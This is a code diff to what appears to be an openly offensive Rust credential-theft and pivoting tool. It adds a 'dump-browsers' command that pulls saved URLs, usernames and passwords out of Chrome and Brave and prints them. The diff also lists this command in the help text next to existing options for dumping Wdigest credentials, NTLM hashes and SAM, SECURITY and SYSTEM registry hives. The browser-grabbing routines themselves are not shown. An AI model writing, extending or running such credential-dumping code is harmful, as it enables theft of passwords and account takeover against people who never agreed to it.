@@ -7,6 +7,10 @@ use passwords::{
     hives::Hives,
     ntlm::Ntlm,
     wdigest::Wdigest, 
+    browsers::chromium::{
+        brave::Brave,
+        chrome::Chrome,
+    },
 };
 
 use pivioting::{
@@ -107,6 +111,17 @@ fn handle_user_input(args: Vec<String>) -> Result<()> {
                     "dump-credentials" => {
                         Wdigest::grab()?;
                     },
+                    "dump-browsers" => {
+                        println!("[-- Chrome dumped credentials] --");
+                        for cred in Chrome::grab() {
+                            println!("{}", cred);
+                        }
+
+                        println!("[-- Brave dumped credentials] --");
+                        for cred in Brave::grab() {
+                            println!("{}", cred);
+                        }
+                    },
                     "dump-hashes" => {
                         Ntlm::grab()?;
                     },
@@ -127,6 +142,7 @@ fn handle_user_input(args: Vec<String>) -> Result<()> {
                     },
                     _ => {
                         println!("
+                        \rdump-browsers                Dumps chromium based browsers saved urls, usernames and passwords.
                         \rdump-credentials             Dumps systems credentials through Wdigest.
                         \rdump-hashes                  Dumps systems NTLM hashes (requires SYSTEM permissions).
                         \rdump-hives                   Dumps SAM, SECURITY and SYSTEM hives (requires SYSTEM permissions).
@@ -228,6 +244,7 @@ fn handle_user_input(args: Vec<String>) -> Result<()> {
             \rChoose one of the following options:
             \r
             \r      passwords:
+            \r              • dump-browsers                Dumps chromium based browsers saved urls, usernames and passwords.
             \r              • dump-credentials             Dumps systems credentials through Wdigest.
             \r              • dump-hashes                  Dumps systems NTLM hashes (requires SYSTEM permissions).
             \r              • dump-hives                   Dumps SAM, SECURITY and SYSTEM hives (requires SYSTEM permissions).
